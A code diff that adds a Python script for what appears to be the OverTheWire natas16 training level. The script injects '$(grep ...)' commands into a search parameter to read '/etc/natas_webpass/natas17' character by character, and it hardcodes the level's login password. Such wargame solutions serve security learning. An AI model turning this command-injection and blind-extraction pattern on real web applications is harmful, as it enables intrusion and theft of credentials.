@@ -21,3 +21,26 @@ for i in range (0,32):
                 if 'exists' in response:
                         password =password+char
                         print (password)
+
+
+___________________________*********************************________________________________________________
+
+import requests
+
+char="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
+output=""
+target="http://natas16.natas.labs.overthewire.org/"
+passwd=""
+
+for i in range(0,32):
+    for x in char:
+        passwd +=x
+        payload= ("?needle=$(grep+-E+^{}.*+/etc/natas_webpass/natas17)hello&submit=Search").format(output+x)
+        print (payload)
+        r= requests.get(target +payload, auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
+        response = r.text
+        if("hellos" in response):
+            pass
+        else:
+            output +=x
+            print (output)
